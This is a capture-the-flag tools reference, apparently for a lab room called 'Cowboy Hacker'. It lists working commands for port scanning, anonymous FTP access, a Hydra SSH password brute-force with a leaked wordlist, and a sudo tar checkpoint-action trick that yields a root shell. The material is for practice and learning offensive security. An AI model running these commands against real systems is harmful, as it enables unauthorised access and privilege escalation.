# Cowboy Hacker — Tools Reference

## Nmap

- **Purpose**: Port scanning and service/version detection
- **Usage**: Identify open ports and banner-level service versions before attacking
- **Command**: `nmap -sV -sC 10.49.172.169`

## FTP Client

- **Purpose**: Connect to the vsFTPd service and retrieve files
- **Usage**: Log in as `anonymous` with a blank password; use `ls` / `get`
- **Troubleshooting**: If active mode fails (`425 Failed to establish connection`) and the server refuses passive mode, the data channel is blocked — run from the AttackBox/VPN instead of assuming the service is broken
- **Command**: `ftp 10.49.172.169`

## Hydra

- **Purpose**: Online brute-force of the SSH password
- **Usage**: Feed it the target username and the leaked `locks.txt` wordlist
- **Command**: `hydra -l lin -P locks.txt ssh://10.49.172.169`

## SSH Client

- **Purpose**: Log in once the credentials are recovered
- **Command**: `ssh lin@10.49.172.169`

## sudo

- **Purpose**: Review current user's elevated privileges
- **Usage**: `sudo -l` immediately after landing on the box to enumerate all sudo-granted binaries
- **Command**: `sudo -l`

## GTFOBins — tar

- **Purpose**: Turn a sudo-whitelisted `tar` binary into a root shell
- **Usage**: `tar`'s `--checkpoint-action=exec` runs an arbitrary command at each checkpoint; since `tar` runs as root, the command runs as root
- **Command**: `sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
